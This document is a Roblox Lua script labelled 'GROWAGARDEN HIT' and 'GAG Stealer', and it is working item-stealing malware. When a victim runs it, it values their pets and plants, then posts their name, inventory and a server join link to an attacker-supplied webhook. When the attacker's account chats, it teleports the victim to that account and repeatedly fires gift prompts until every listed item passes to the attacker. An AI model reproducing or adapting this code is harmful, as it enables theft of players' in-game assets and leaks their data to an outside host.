-- GROWAGARDEN HIT by namnnni2

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack")
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")
local dataService = require(modules:WaitForChild("DataService"))
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))

-- Settings
local webhook = getfenv()["Webhook"]
local username = getfenv()["Username"]

if not webhook or not username then return warn("Missing Webhook or Username") end

local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox"}

local itemsToSend = {}
local totalValue = 0
local hasRare = false
local hasHeavy = false

local function formatNumber(num)
	local suffix = {"", "k", "m", "b", "t"}
	local i = 1
	while num >= 1000 and i < #suffix do
		num = num / 1000
		i = i + 1
	end
	return string.format("%.2f%s", num, suffix[i])
end

local function calcPetValue(data)
	local egg = data.PetData.HatchedFrom
	local eggData = petRegistry.PetEggs[egg]
	if not eggData then return 0 end
	local rarity = eggData.RarityData.Items[data.PetType]
	if not rarity then return 0 end
	local range = rarity.GeneratedPetData.WeightRange
	local lerp = numberUtil.ReverseLerp(range[1], range[2], data.PetData.BaseWeight)
	local wMult = math.lerp(0.8, 1.2, lerp)
	local lMult = math.lerp(0.15, 6, petUtils:GetLevelProgress(data.PetData.Level))
	return math.floor(petRegistry.PetList[data.PetType].SellPrice * wMult * lMult)
end

for _, tool in ipairs(backpack:GetChildren()) do
	if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
		if tool:GetAttribute("ItemType") == "Pet" then
			local uuid = tool:GetAttribute("PET_UUID")
			local petData = dataService:GetData().PetsData.PetInventory.Data[uuid]
			local weight = tonumber(petData.PetData.BaseWeight) or 0
			local name = petData.PetType
			local value = calcPetValue(petData)
			if weight >= 10 then hasHeavy = true end
			if table.find(rarePets, name) then hasRare = true end
			totalValue += value
			table.insert(itemsToSend, {Tool = tool, Name = name, Weight = weight, Value = value, Type = "Pet"})
		else
			local value = calcPlantValue(tool)
			totalValue += value
			table.insert(itemsToSend, {Tool = tool, Name = tool.Name, Weight = 0, Value = value, Type = "Plant"})
		end
	end
end

if #itemsToSend == 0 then return end

table.sort(itemsToSend, function(a, b)
	if a.Type == "Pet" and b.Type ~= "Pet" then return true end
	if a.Type ~= "Pet" and b.Type == "Pet" then return false end
	return a.Value > b.Value
end)

-- Send Webhook
local content = (hasRare or hasHeavy) and "@everyone\n" or ""
content = content .. "**JobId:** `" .. game.JobId .. "`"

local itemText = ""
for _, item in ipairs(itemsToSend) do
	itemText ..= string.format("%s (%.2f KG): â‚µ%s\n", item.Name, item.Weight, formatNumber(item.Value))
	if #itemText > 1024 then
		itemText = itemText:sub(1, 1010) .. "\n...more items"
		break
	end
end

pcall(function()
	HttpService:PostAsync(webhook, HttpService:JSONEncode({
		content = content,
		embeds = {{
			title = "ðŸŽ¯ GROWAGARDEN HIT by namnnni2",
			color = 65280,
			fields = {
				{name = "Victim", value = plr.Name, inline = true},
				{name = "Total Value", value = "â‚µ" .. formatNumber(totalValue), inline = true},
				{name = "Join Link", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId},
				{name = "Items", value = itemText}
			},
			footer = {text = "GAG Stealer by " .. username}
		}}
	}), Enum.HttpContentType.ApplicationJson)
end)

-- Follow & Steal when target user chats
local function stealFrom(target)
	local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
	local other = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
	if not (root and other) then return end

	while true do
		root.CFrame = other.CFrame + Vector3.new(0, 0, 2)
		task.wait(0.1)
	end
end

local function giftItems(target)
	local root = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
	local prompt = root and root:FindFirstChildWhichIsA("ProximityPrompt", true)
	if not prompt then return end

	for _, item in ipairs(itemsToSend) do
		item.Tool.Parent = plr.Character
		repeat task.wait(0.05) until prompt.Enabled
		fireproximityprompt(prompt)
		repeat task.wait(0.1) until not backpack:FindFirstChild(item.Tool.Name)
		task.wait(0.1)
	end
end

for _, p in pairs(Players:GetPlayers()) do
	if p.Name == username then
		p.Chatted:Connect(function()
			task.spawn(function()
				stealFrom(p)
			end)
			task.wait(1)
			giftItems(p)
		end)
	end
end

Players.PlayerAdded:Connect(function(p)
	if p.Name == username then
		p.Chatted:Connect(function()
			task.spawn(function()
				stealFrom(p)
			end)
			task.wait(1)
			giftItems(p)
		end)
	end
end)
